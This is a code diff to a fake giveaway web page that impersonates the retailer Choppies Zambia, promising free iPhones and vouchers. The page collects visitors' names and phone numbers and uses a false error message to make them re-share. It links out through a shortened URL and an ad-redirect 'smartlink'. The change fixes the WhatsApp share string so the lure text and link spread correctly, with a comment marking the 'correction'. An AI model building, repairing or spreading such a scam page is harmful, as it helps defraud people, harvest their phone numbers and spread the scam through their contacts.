@@ -564,15 +564,16 @@ Thanks you verry much Choppies! I received a iPhone 17 today and it arrived imme
     </div>
     <script src="https://code.jquery.com/jquery-latest.min.js"></script>
     <script>
-        var errorname = "Please enter the name correctly!",
-            errornumber = "Please enter your number correctly, example 05xxxxxxx",
-            text = "To celebrate its 10th anniversary Big Birthday Bonanza, Choppies Zambia is now giving free vouchers, gift cards, Iphones and many other packages",
-            link = "https://tinyurl.com/Choppies-Zambia-Bonanza",
-            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-            smartlink = "https://obqj2.com/4/10002984",
-            saved = "pp1",
-            share = "whatsapp://send?text=" + link;
-    </script>
+    var errorname = "Please enter the name correctly!",
+        errornumber = "Please enter your number correctly, example 05xxxxxxx",
+        text = "To celebrate its 10th anniversary Big Birthday Bonanza, Choppies Zambia is now giving free vouchers, gift cards, Iphones and many other packages",
+        link = "https://tinyurl.com/Choppies-Zambia-Bonanza",
+        error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+        smartlink = "https://obqj2.com/4/10002984",
+        saved = "pp1",
+        // The correction is here: combining 'text' with a newline (%0A) and 'link'
+        share = "whatsapp://send?text=" + encodeURIComponent(text) + "%0A" + encodeURIComponent(link); 
+</script>
 
 <script type="text/javascript">
 var time = 0;
